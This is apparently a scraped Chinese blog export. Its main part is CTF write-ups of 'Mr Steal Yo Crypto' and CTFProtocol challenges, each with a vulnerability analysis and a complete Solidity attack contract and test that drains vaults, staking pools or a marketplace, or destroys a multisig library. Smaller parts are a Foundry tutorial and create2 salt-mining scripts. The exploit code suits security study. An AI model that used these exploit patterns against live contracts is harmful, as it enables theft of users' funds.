Vault1. question Safu Labs has just released their SafuVault, the safest yield generating vault of all time, or so their twitter account says. Their SafuVault expects deposits of USDC and has already gotten 10,000 USDC from users. You know the drill, drain the funds (at least 90%). You start with 10,000 USDC. 2. analysis 这道题我觉得难，难在我对递归这一数据结构忘得差不多了，导致我在进行重入的时候纠结了大半天。 这道题大致看了一遍代码，最开始觉得问题肯定是出在shares = (_amount * totalSupply()) / (_pool)，而且分析withdrawAll()函数可以发现，如果取款数目大于金库的余额，金库的做法是将里面所有的钱取出来，所以看到这里就有了一点点眉目了，但是_burn(msg.sender, _shares)限制了取款数额最大为_shares，所以目标就是尽可以让SafuVault为自己创建更多的tokens，兜兜转转还是取决于这行代码shares = (_amount * totalSupply()) / (_pool)。 如果是通过deposit或者depositAll函数进行存款的话，无论你如何修改_pool和_after的值，你只会亏损，这里被折磨了。。。直到我看到了depositFor函数，这里的token为自定义，意味着transferFrom可以为自己所编写。这里有点类似重入，而重入我个人感觉和递归很像。可以在transferFrom调用depositFor，再进行转钱，这样就可以控制在每一次递归调用的时候_pool的值始终都是10000 ether。而_after的值每一次都会累加_amount，从而使得_amount的值越来越大，totalSupply也跟随着越来越大，_pool恒为10000 ether，这样就可以为自己创建尽可能多的TP代币。 3. solve攻击合约 1234567891011121314151617181920212223242526272829303132333435// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SafuVault.sol&quot;;import &quot;../other/Token.sol&quot;;import &quot;hardhat/console.sol&quot;;contract SafuVaultHacker &#123; SafuVault safuVault; IStrategy strategy; Token token; // USDC uint counter; constructor(address _safuVault, address _token) &#123; safuVault = SafuVault(_safuVault); strategy = safuVault.strategy(); token = Token(_token); &#125; function attack() public &#123; token.approve(address(safuVault), type(uint).max); safuVault.depositFor(address(this), 1000 ether, address(this)); // the 1000 ether is unuse safuVault.withdrawAll(); token.transfer(msg.sender, token.balanceOf(address(this))); &#125; function transferFrom(address, address, uint256) public &#123; if (counter &lt; 9) &#123; counter++; safuVault.depositFor(address(this), 1000 ether, address(this)); token.transfer(address(safuVault), 1000 ether); &#125; &#125;&#125; ts文件代码 123456789101112it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here // deploy hacker let safuVaultHacker = await (await ethers.getContractFactory(&quot;SafuVaultHacker&quot;, attacker)).deploy(safuVault.address, usdc.address); // tranfer to hacker await usdc.connect(attacker).transfer(safuVaultHacker.address, await usdc.balanceOf(await attacker.getAddress())); // attack await safuVaultHacker.attack();&#125;); Challenge 03 - Game Assets1. question GG labs just released their nOtApOnZi game that allows multiple WLed NFTs to be used as in-game items. To integrate the multiple ERC721 tokens, they have a wrapper contract (ERC1155) that wraps the NFTs, allowing them to be used in-game. Users can also unwrap their NFTs when they are done using them. Your task is to grief users by trapping their NFTs inside the wrapper contract and making them irretrievable 2. analysis 能修改GameAsset.balanceOf该值的函数在包装器中只有setOwnerOperator函数，而在wrap 和 unwrap函数中都有涉及，所以就只能往这里想办法。先看wrap中的setOwnerOperator，要想调用它，必须要满足msg.sender是该代币的所有者，或者是被代币所有者授权，显然这行不通。再看到unwrap中的setOwnerOperator，要想执行该函数必须通过_burn(assetOwner, assetId, 1);即，msg.sender必须拥有“包装币”，而“包装币”通过warp函数得到，兜兜转转有得回到wrap中。 漏洞出现在wrap函数中，require(isWhitelisted(assetAddress), &quot;Wrapper: asset not whitelisted&quot;);这个限制条件很容易通过，意味着_wrap(assetOwner, assetAddress, nftId);可以成功 执行，至于后面那些代币所有权的判断可以先不管。 分析_wrap中的_mint，分析_mint不难看出，这个铸币函数几乎没什么特别的限制，函数功能就是简单的为to声明为某token id 的所有者。但是_doSafeTransferAcceptanceCheck函数就有玄机了，代码会去执行to中的onERC1155Received函数，只需在onERC1155Received函数中调用unwrap即可完成。 *因为，如果在调用wrap函数的时候，将assetOwner的值设置为hacker，wrapper将会为hacker铸造“包装币”，此时通过hacker中的onERC1155Received()函数执行unwrap函数，这样就可以成功通过_burn函数，然后执行_unwrap中的setOwnerOperator，此时hacker便是该token的owner。随后代码继续执行wrap接下来的代码，又因为hacker成为了owner，所以接下来的断言可以通过，最后执行setOwnerOperator*，将该token的所有权从hacker移交到wrap中，即可满足题意。 3. solve攻击合约 12345678910111213141516171819202122232425262728293031323334//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./AssetWrapper.sol&quot;;import &quot;hardhat/console.sol&quot;;contract AssetWrapperHacker &#123; AssetWrapper wrapper; IGameAsset swordAsset; IGameAsset shieldAsset; address gameAsset; constructor(address _wrapper, address _swordAsset, address _shieldAsset) &#123; wrapper = AssetWrapper(_wrapper); swordAsset = IGameAsset(_swordAsset); shieldAsset = IGameAsset(_shieldAsset); &#125; function attack() public &#123; _attack(swordAsset); _attack(shieldAsset); &#125; function _attack(IGameAsset _gameAsset) internal &#123; gameAsset = address(_gameAsset); wrapper.wrap(0, address(this), gameAsset); &#125; function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4)&#123; wrapper.unwrap(address(this), gameAsset); return this.onERC1155Received.selector; &#125;&#125; ts文件代码 12345678910it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let assetWrapperHacker = await (await ethers.getContractFactory(&quot;AssetWrapperHacker&quot;, attacker)).deploy( assetWrapper.address, swordAsset.address, shieldAsset.address); await assetWrapperHacker.attack();&#125;); Challenge 04 - Free Lunch1. question SafuSwap has just launched their sexy new UniswapV2 fork. It includes a SafuMakerV2 contract which is tasked with converting protocol trading fees to SAFU, its farm token, for later distribution to SAFU stakers. You start with 100 USDC and 100 SAFU, and your task is to increase your balance of both tokens by at least 50x through draining SafuSwap’s funds. 2. analysis 要使得attacker的 USDC和SAFU代币变得很多，只能通过获取Lp(USDC-SAFU)的流动性，调用removeLiquidity()函数消除流动性，从而增加 这两种代币的数量。 观察JS文件，可知admin事先往 SafuMakerV2 合约转入了大量的 pair token(Lp_usdc_safu)，（这里可以看作是流动性）。SafuMakerV2 中的convert()作用是将任意代币转为 SAFU代币，其中也包括了pair token(Lp_usdc_safu)。 我的目的是： 得到大量的 Lp(USDC-SAFU)的流动性，即 pair token(Lp_usdc_safu) 再通过移除流动性，获取交易对中的两种代币。 攻击思路为： 构建 Lp(Lp(USDC-SAFU)-SAFU)代币，通过 convert()函数中的pair.burn(address(this))，将移除(LP USDC-SAFU)-SAFU的流动性，pair会将 pair token(Lp_usdc_safu)代币和SAFU发送到 maker合约，在执行到_convertStep()函数，该步骤会将maker的所有pair token(Lp_usdc_safu)代币转移到Lp(Lp(USDC-SAFU)-SAFU)交易池中，该步骤实现的：**IERC20(fromToken).safeTransfer(address(pair), amountIn);**，此时Lp(Lp(USDC-SAFU)-SAFU)交易池的两种代币数量发生很大变化，即pair token(Lp_usdc_safu)代币大量增加，此时移除流动性会发生： uint balance0 = IERC20(_token0).balanceOf(address(this)); amount0 = liquidity.mul(balance0) / _totalSupply; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788- balance0的值变大，从而amount的值也增大，所以会获得比之前更多的pair token(Lp_usdc_safu)代币- 再然后到Lp(USDC-SAFU)中移除流动性，所以可以通过移除多的流动性，得到更多的 USDC和SAFU。#### 3. solve*攻击合约*```solidity//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./SafuMakerV2.sol&quot;;interface IUniswapV2Router02 &#123; function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin,uint256 amountBMin, address to, uint256 deadline) external returns (uint256 amountA, uint256 amountB, uint256 liquidity); function removeLiquidity( address tokenA,address tokenB, uint256 liquidity, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline ) external returns (uint256 amountA, uint256 amountB); function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] calldata path, address to, uint256 deadline) external; function factory() external view returns(address);&#125;contract SafuMakerV2Exploit &#123; ISafuFactory factory; IUniswapV2Router02 router; SafuMakerV2 maker; IERC20 safu; IERC20 usdc; IERC20 public pair; address public U_Spair; constructor(address _maker, address _router, address _safu, address _usdc, address _pair) &#123; maker = SafuMakerV2(_maker); router = IUniswapV2Router02(_router); factory = maker.factory(); safu = IERC20(_safu); usdc = IERC20(_usdc); pair = IERC20(_pair); &#125; // add the liquidity function pwn1(address hacker) public &#123; usdc.approve(address(router), type(uint256).max); safu.approve(address(router), type(uint256).max); // 为了获得 Lp(usdc-safu)代币 router.addLiquidity( address(usdc), address(safu), 80 ether, 80 ether, 0, 0, address(this), block.timestamp ); // create Lp(Lp(usdc-safu), safu) pair.approve(address(router), type(uint256).max); router.addLiquidity( address(pair), address(safu), 10 ether, 10 ether, 0, 0, address(this), block.timestamp ); // ready to convert pair token to safu U_Spair = factory.getPair(address(pair), address(safu)); IERC20(U_Spair).transfer(address(maker), 1 ether); &#125; // remove the liquidity function pwn2() public &#123; IERC20(U_Spair).approve(address(router), type(uint256).max); router.removeLiquidity(address(pair), address(safu), IERC20(U_Spair).balanceOf(address(this)), 0, 0, address(this), block.timestamp); router.removeLiquidity(address(usdc), address(safu), pair.balanceOf(address(this)), 0, 0, msg.sender, block.timestamp); &#125;&#125; ts文件代码 1234567891011121314151617181920212223it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploitFactory = await ethers.getContractFactory(&quot;SafuMakerV2Exploit&quot;); let pairAddress = await safuFactory.getPair(usdc.address,safu.address) let exploit = await exploitFactory.connect(attacker).deploy( safuMaker.address, safuRouter.address, safu.address, usdc.address, pairAddress ); // transfer USDC and SAFU let hacker = await attacker.getAddress(); await usdc.connect(attacker).transfer(exploit.address, await usdc.balanceOf(hacker)); await safu.connect(attacker).transfer(exploit.address, await safu.balanceOf(hacker)); // pwn() await exploit.connect(attacker).pwn1(hacker); let pair = await exploit.pair(); await safuMaker.connect(attacker).convert(pair, safu.address); await exploit.connect(attacker).pwn2(); &#125;); Challenge 05 - Safu Wallet1. question After Safu Labs’ SafuVault product was exploited, they decided to start fresh and venture into the secure web3 tooling space - what could go wrong. They’ve launched their first product: a multi-sig wallet, and have already onboarded a user. Your task is to grief that user by trapping their funds inside the wallet. 2. analysis 题目要求将钱包合约破坏，即无法正常执行。 可以看到这里代理合约，逻辑合约为 SafuWalletLibrary，要使得这个代理合约无法执行，即将代理合约中的逻辑合约毁坏就好了，在逻辑合约中有kill函数，只要成功执行该函数即可。但是，必须通过onlymanyowners修饰器的验证，而通过验证的必须成为owner，将逻辑合约中的m_required变量为0，因为 0&amp;any&#x3D;&#x3D;0。看到这里其实是没办法的，因为初始化只能执行一次，但是仔细看我发现，在wallet初始化的时候执行的是delegatecall，这就很离谱了，这根本就没有动任何library中的数据。所以该合约未被初始化过，所以任何人可以将其初始化。 3. solve攻击合约 12345678910111213141516171819202122232425//SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface ISafuWalletLibrary &#123; function initWallet(address[] memory _owners, uint _required, uint _daylimit) external; function kill(address) external;&#125;contract SafuWalletExploit &#123; ISafuWalletLibrary library_; constructor() &#123; library_ = ISafuWalletLibrary(0x057ef64E23666F000b34aE31332854aCBd1c8544); &#125; function pwn() public &#123; address[] memory fakeOwners = new address[](1); fakeOwners[0] = address(this); library_.initWallet(fakeOwners, 0, type(uint256).max); library_.kill(msg.sender); &#125;&#125; ts文件代码 1234567it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here m_dailyLimit let exploit = await (await ethers.getContractFactory(&quot;SafuWalletExploit&quot;, attacker)).deploy(); await exploit.pwn();&#125;); Challenge 06 - Tasty Stake1. question [redacted] labs have released their TastyStaking contract, which allows you to stake STEAK in order to farm BUTTER tokens. Your task is to drain all of the STEAK tokens from the staking contract. 2. analysis 这题题目要求是将 staking的 STEAK 代币全部偷走。 能从该 staking中取钱的函数只能是 withdraw() 函数，该函数没啥子问题，有多少 balance就只能取多少 balance。所以需要想办法如何是自己手中的 balance变得很大。 _applyStake()函数，可以修改balance，在调用该函数的外部函数中，migrateStake()函数则是本题漏洞，该函数的调用没有限制，所以可以任意修改自己的 balance至于TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);这行代码，因为 old Staking是可控的，所以只要hacker简单执行一下就可以从共执行了。 3. solve攻击合约 1234567891011121314151617181920212223242526272829//SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./TastyStaking.sol&quot;;contract TastyStakingExploit &#123; TastyStaking staking; IERC20 stakingToken; constructor(address _staking) &#123; staking = TastyStaking(_staking); stakingToken = staking.stakingToken(); &#125; function pwn() public &#123; uint256 stealMoney = stakingToken.balanceOf(address(staking)); // 1. 将 exploit 的余额设置为 10000 ether staking.migrateStake(address(this), stealMoney); // 2. 盗取 STEAK staking.withdraw(stealMoney, true); // 3. 将盗取的 STEAK转移到 attacker 账户中 stakingToken.transfer(msg.sender, stealMoney); &#125; function migrateWithdraw(address staker, uint256 amount) external&#123;&#125;&#125; ts文件代码 1234567it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploit = await (await ethers.getContractFactory(&quot;TastyStakingExploit&quot;, attacker)).deploy(tastyStaking.address); await exploit.connect(attacker).pwn();&#125;); Challenge 07 - Freebie1. question There’s a staking contract RewardsAdvisor which accepts FARM tokens and mints an equivalent amount of xFARM. xFARM is used for governance and within [redacted]’s defi ecosystem. Your task is to drain 99.99%+ of the FARM tokens from this contract. 2. analysis 这题的要求盗取 Advisor中 99.9%+的FARM代币，取钱的入口是 withdraw函数，可以看到函数体中的断言很草率，随随便便就可以通过了，取钱的需要代换，即取多少的 FAME则需要支付对应量的xFARM，所以所以问题转移到如何获取更多的 xFAME。 看到deposit函数，观察函数体，可以看出这个函数漏洞百出，如果 from是合约的话，甚至可以不执行farm.safeTransferFrom(from, address(this), farmDeposit);，可以直接白嫖XFAME，所以将 from设置为攻击合约简单实现delegatedTransferERC20函数即可。 3. solve攻击合约 12345678910111213141516171819202122232425262728293031323334353637//SPDX-License-Identifier: MITpragma solidity ^0.8.4;interface IRewardsAdvisor &#123; function deposit( uint256 farmDeposit, address payable from, address to ) external returns (uint256 shares); function withdraw( uint256 shares, address to, address payable from ) external returns (uint256 rewards);&#125;contract FreebieExploit &#123; IRewardsAdvisor advisor; address public owner; constructor(address _advisor) &#123; advisor = IRewardsAdvisor(_advisor); owner = address(this); &#125; function pwn() public &#123; advisor.deposit(99999999 ether, payable(address(this)), address(this)); advisor.withdraw(99999999 ether, msg.sender, payable(address(this))); &#125; function delegatedTransferERC20(address token, address to, uint256 amount) external&#123;&#125; receive() external payable &#123;&#125;&#125; ts文件代码 12345678it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploit = await (await ethers.getContractFactory(&quot;FreebieExploit&quot;, attacker)).deploy(rewardsAdvisor.address); await exploit.connect(attacker).pwn();&#125;); Challenge 08 - NFT Bonanza1. question The new NFT exchange contract BonanzaMarketplace has launched, which allows trading for select whitelisted ERC721 and ERC1155 tokens. Your challenge is to swipe all the listed NFTs. 2. analysis 这题要求将 market 上架的两种 NFTA 和 NFTB买下，但是我的 TOKEN 代币为0。 分析buyItem()函数，这个函数实现的是购买 NFT，支付费用的计算式为： 12uint256 totalPrice = _pricePerItem * _quantity;uint256 feeAmount = totalPrice * fee / BASIS_POINTS; 问题在于 _quantity，看到require(listedItem.quantity &gt;= _quantity, &quot;not enough quantity&quot;);只要求传入的数量小于1，然后就将NTF转移到我的账户下。如果 _quantity的值是0，那也可以通过断言，且待支付的费用为0。 3. solve攻击合约 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IERC721 &#123; function safeTransferFrom(address from, address to, uint256 tokenId) external;&#125;interface IBonanzaMarketplace &#123; function buyItem(address _nftAddress, uint256 _tokenId, address _owner, uint256 _quantity)external;&#125;contract NFTBonanzaExploit &#123; IBonanzaMarketplace market; IERC721 NFTA; IERC721 NFTB; address adminUser; constructor(address _market, address _nfta, address _nftb, address _adminUser) &#123; market = IBonanzaMarketplace(_market); NFTA = IERC721(_nfta); NFTB = IERC721(_nftb); adminUser = _adminUser; &#125; function pwn() public &#123; market.buyItem(address(NFTA), 0, adminUser, 0); market.buyItem(address(NFTB), 0, adminUser, 0); NFTA.safeTransferFrom(address(this), msg.sender, 0); NFTB.safeTransferFrom(address(this), msg.sender, 0); &#125; function onERC721Received(address a,address from,uint tokenId,bytes memory data) public returns (bytes4 retval) &#123; return this.onERC721Received.selector; &#125;&#125; ts文件代码 123456789it(&quot;solves the challenge&quot;, async function () &#123; // implement solution here let exploit = await (await ethers.getContractFactory(&quot;NFTBonanzaExploit&quot;, attacker)).deploy( bonanzaMarketplace.address, nftA.address, nftB.address, await adminUser.getAddress() ); await exploit.connect(attacker).pwn();&#125;); Challenge 09 - Inflationary Net Worth1. question There’s a MasterChef contract which accepts MULA tokens and mints MUNY as rewards to stakers. MULA has a deflationary transfer tax mechanism which burns 5% of each transfer, in order to properly incentivize long term holders. Your task is to trick MasterChef into minting you all of the MUNY allocated to all stakers. You start with 10,000 MULA. 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Mr Steal Yo Crypto","slug":"CTFS/Mr-Steal-Yo-Crypto","permalink":"https://biyouqiuqiu.com/categories/CTFS/Mr-Steal-Yo-Crypto/"}],"tags":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/tags/CTFS/"}]},{"title":"foundry_using","slug":"Utils/Foundry/foundry_using","date":"2023-09-07T05:47:10.000Z","updated":"2023-09-07T05:47:10.000Z","comments":true,"path":"2023/09/07/Utils/Foundry/foundry_using/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/07/Utils/Foundry/foundry_using/","excerpt":"","text":"引言官方文档 下载安装(Windows版) 📌 小插曲 本人用的是Windows系统的电脑，而网上的一些安装教学基本上都不好用。有的说要去下载最新版本的VSCode，有的说要去下载c++编译器，还有去下载rust等等。反正我兜兜转转一大圈回来，emmm，c盘莫名其妙少了10个G。最后还是在学长的建议中把foundry安装好了。 可以直接到GitHub上找到.exe文件，下载下来之后，将其配置到环境变量中即可。下载链接：LINK ，其中下载的是.zip那个压缩包。 随后，在桌面打开命令行(win+cmd)，输入forge test，运行结果应该为Nothing to compile 0x00. Foundry操作指令 初始化 Foundry项目 1forge init [项目名字] 编译合约 1forge compile 部署合约 使用forge create指令 配置临时环境变量（即当前窗口有效） powershell：例如 &#x3D;&gt; $env:PRIVATE_KEY&#x3D;”xxxx”，取值：$env:PRIVATE_KEY cmd: 例如 &#x3D;&gt; set PRIVATE_KEY&#x3D;”xxxx”，取值： %PRIVATE_KEY% keystore的使用：link 1234567891011forge create --rpc-url &lt;your_rpc_url&gt; --private-key &lt;your_private_key&gt; --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; &lt;contract_name&gt;## 配置环境变量之后## powershellforge create --rpc-url $env:RPC_URL --private-key $env:PRIVATE_KEY --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; &lt;contract_name&gt;##cmdforge create --rpc-url %RPC_URL% --private-key %PRIVATE_KEY% --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; &lt;contract_name&gt;## 如果有合约同名的情况则需要使用文件路径来区分forge create --rpc-url &lt;your_rpc_url&gt; --private-key &lt;your_private_key&gt; --constructor-args &lt;arg1&gt; &lt;arg2&gt; ... &lt;argN&gt; src/.../MyContract.sol:MyContract 使用 forge script指令 同上假设已经配置好临时环境变量 待部署合约为 script/DeploySimpleStorage.s.sol DeploySimpleStorage.s.sol 123456789101112131415// SPDX-License-Identifier: MITpragma solidity 0.8.20;import &#123; Script &#125; from &quot;forge-std/Script.sol&quot;;import &#123; SimpleStorage &#125; from &quot;../src/SimpleStorage.sol&quot;;contract DeploySimpleStorage is Script &#123; function run() external returns (SimpleStorage) &#123; vm.startBroadcast(); SimpleStorage simpleStorage = new SimpleStorage(); vm.stopBroadcast(); return simpleStorage; &#125;&#125; 1forge script script/xxxx/xxx.s.sol:xxx --rpc-url $env:RPC_URL --broadcast --private-key $env:PRIVATE_KEY 调用合约函数 调用写函数 1cast send &lt;contract_address&gt; &lt;function(args type)&gt; &lt;args...&gt; --rpc-url $env:RPC_URL --private-key $env:PRIVATE_KEY example: ​ 调用读函数 1cast call &lt;contract_address&gt; &lt;function(args type)&gt; &lt;args...&gt; --rpc-url $env:RPC_URL --private-key $env:PRIVATE_KEY example: 0x01. Deploy on L20x02. Foundy.toml","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"foundry","slug":"Utils/foundry","permalink":"https://biyouqiuqiu.com/categories/Utils/foundry/"}],"tags":[{"name":"foundry","slug":"foundry","permalink":"https://biyouqiuqiu.com/tags/foundry/"}]},{"title":"utils-create2","slug":"Basic_Knowledge/solidity/utils-create2","date":"2023-09-04T04:10:10.000Z","updated":"2023-09-04T04:10:10.000Z","comments":true,"path":"2023/09/04/Basic_Knowledge/solidity/utils-create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/04/Basic_Knowledge/solidity/utils-create2/","excerpt":"","text":"引言 在靶场刷题的时候经常会遇到各种涉及到create2操作码的题，这里整理了两个计算脚本(一个用于创建空参构造器的合约，另一个是用于创建带参构造器的合约)，都是基于etherjs-v5 注：脚本只是辅助计算，并不是创建合约，创建合约还得通过智能合约来实现。 空参构造器1234567891011121314151617181920212223242526272829303132import &#123; ethers &#125; from &quot;ethers&quot;const const_num = &quot;0xFF&quot;;const contract_add = &quot;&quot;;let str1 = const_num + contract_add.slice(2,contract_add.length);const bytecode = &quot;&quot;;const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);let salt = 0;const value = &quot;&quot;; // 指定特殊值while (true) &#123; let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); //按照需求进行过滤 if (hash.slice(hash.length - 2, hash.length) == value) &#123; console.log(`salt = $&#123;salt&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 配合使用的solidity代码 123456789101112131415161718 // /* 使用内联汇编自带的 create2() */function create2NewContractByInline(uint salt) public returns (address) &#123; // bytes memory code = type(Test).creationCode; // 如果待部署合约的构造器中有参数，则使用如下方式进行获取code bytes memory code = abi.encodePacked(type(Test).creationCode, abi.encode(msg.sender, &quot;biyou&quot;)); bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value 表示要向新合约发送的以太币数量 add(code, 32), // 表示跳过数组长度 mload(code), // 读取code的长度 _salt // 盐 ) &#125; return result;&#125; 带参构造器12345678910111213141516171819202122232425262728293031323334353637import &#123; ethers &#125; from &quot;ethers&quot;const const_num = &quot;0xFF&quot;;const contract_add = &quot;&quot;; // deploy 合约地址let str1 = const_num + contract_add.slice(2,contract_add.length);let bytecode = &quot;&quot;;// 等同于 solidity中的 abi.encode()const variable_code = new ethers.utils.AbiCoder().encode([&#x27;type&#x27;], [value]);bytecode = bytecode + variable_code.slice(2,variable_code.length);const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);let salt = 0;const value = &quot;&quot;; // 指定特殊值while (true) &#123; let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); //按照需求进行过滤 if (hash.slice(hash.length - 2, hash.length) == value) &#123; console.log(`salt = $&#123;salt&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 配合使用的solidity代码 1234567891011121314151617181920function create2NewContractByInline(uint salt) public returns (address) &#123; /* 如果待部署合约的构造器中有参数，则使用如下方式进行获取code type():待部署的合约名 abi.encode():部署合约需要传入的参数 */ bytes memory code = abi.encodePacked(type().creationCode, abi.encode()); bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value 表示要向新合约发送的以太币数量 add(code, 32), // 表示跳过数组长度 mload(code), // 读取code的长度 _salt // 盐 ) &#125; return result;&#125; 补充以上代码怎么说呢，毕竟是js代码嘛，数字的转化总会有问题，比如算某个地址对某个数取模是否等于某个值之类的，js代码不能轻易实现，反正对我来说不能，于是变自己编写了一个python 版的计算address的脚本。兼容了上述两种情况，完美应对待构建合约空参和有参两种情况。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from web3 import Web3from eth_abi import encode# 固定常量 0xffconst_value = &quot;0xff&quot;# value of your address(this), delet the `0x`deployer_address = &quot;&quot;deployer_address = deployer_address[2:]# 将前两个值拼接起来prefixed = const_value + deployer_address# 这个为待部署合约的字节码hacker_bytecode = &quot;&quot;# 这里是构造器的参数，encode([&#x27;type&#x27;], [&#x27;value&#x27;])parameter = encode([&#x27;&#x27;],[&quot;&quot;]).hex()# 拼接 字节码 和 构造器参数bytecode = &quot;0x&quot; + hacker_bytecode + parameter# 对 bytecode 进行 hash 运算bytecode_hash = Web3.solidity_keccak([&#x27;bytes&#x27;], [bytecode]).hex()# print(bytecode_hash)i = 0while(True): salt = Web3.solidity_keccak([&#x27;uint256&#x27;], [i]).hex() data = prefixed + salt[2:] + bytecode_hash[2:] hashed = Web3.solidity_keccak([&#x27;bytes&#x27;], [data]).hex() # address(uint(uint160(hashed))) address = hashed[26:] # 按需求设置 if int((&quot;0x&quot; + address), 16) % 1000 == 137: print(&quot;salt=&quot;, i) print(&quot;address=&quot;, (&quot;0x&quot; + address)) break i += 1 用了都说好！！！ 版本package.json: 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.7.2&quot; &#125;&#125;","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"CTFProtocol-2022（11）","slug":"CTFS/CTFProtocol/CTFProtocol","date":"2023-09-01T04:50:10.000Z","updated":"2023-09-01T04:50:10.000Z","comments":true,"path":"2023/09/01/CTFS/CTFProtocol/CTFProtocol/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/01/CTFS/CTFProtocol/CTFProtocol/","excerpt":"","text":"由简入难 The Lost Kitty1. question Lucas is a scientist who lives with his cat in a big house that has 2^256 rooms. His cat likes to play hide and seek and jumps to a random room whenever it hears a door opening in another one. Can you find Lucas’ cat? Set the variable catFound to true to win this challenge. 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/// @title The Lost Kitty/// @author https://twitter.com/Cryptonicle1/// @notice Lucas is a scientist who has lost his cat in a big house that has 2^256 rooms, anon can you find it?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hidden-kittycatcontract HiddenKittyCat &#123; address private immutable _owner; constructor() &#123; _owner = msg.sender; bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69))); assembly &#123; sstore(slot, &quot;KittyCat!&quot;) &#125; &#125; function areYouHidingHere(bytes32 slot) external view returns (bool) &#123; require(msg.sender == _owner, &quot;!owner&quot;); bytes32 kittyPointer; assembly &#123; kittyPointer := sload(slot) &#125; return kittyPointer == &quot;KittyCat!&quot;; &#125; function destroyMe() external &#123; require(msg.sender == _owner, &quot;!owner&quot;); selfdestruct(payable(address(0))); &#125;&#125;contract House &#123; bool public catFound; function isKittyCatHere(bytes32 _slot) external &#123; if (catFound) &#123; return; &#125; HiddenKittyCat hiddenKittyCat = new HiddenKittyCat(); bool found = hiddenKittyCat.areYouHidingHere(_slot); if (!found) &#123; hiddenKittyCat.destroyMe(); &#125; else &#123; catFound = true; &#125; &#125;&#125; 2. analysis 一看到这个bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69)));经典老问题了，badnonce啦，在特定条件下可控，该代码写在构造器中，但是部署操作在House合约的isKittyCatHere()中，所以slot是可控的。 3. solve攻击合约 1234567891011121314151617contract KittyHacker &#123; House house; constructor(address _house) &#123; house = House(_house); &#125; function attack() public &#123; // compute the value of slot in advance bytes32 slot = keccak256(abi.encodePacked(block.timestamp, blockhash(block.number - 69))); house.isKittyCatHere(slot); require(house.catFound(), &quot;Kitty is not be found...&quot;); &#125;&#125; 注意：如果这里还有一个问题，就是确保你的区块高度大于69，否则会报错。。。 RootMe1.question Can you trick the machine to get root access? 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/// @title RootMe/// @author https://twitter.com/tinchoabbate/// @notice Anon, can you trick the machine to get root access?/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/rootmecontract RootMe &#123; bool public victory; mapping(string =&gt; bool) public usernames; mapping(bytes32 =&gt; address) public accountByIdentifier; constructor() &#123; register(&quot;ROOT&quot;, &quot;ROOT&quot;); &#125; modifier onlyRoot() &#123; require(accountByIdentifier[_getIdentifier(&quot;ROOT&quot;, &quot;ROOT&quot;)] == msg.sender, &quot;Not authorized&quot;); _; &#125; function register(string memory username, string memory salt) 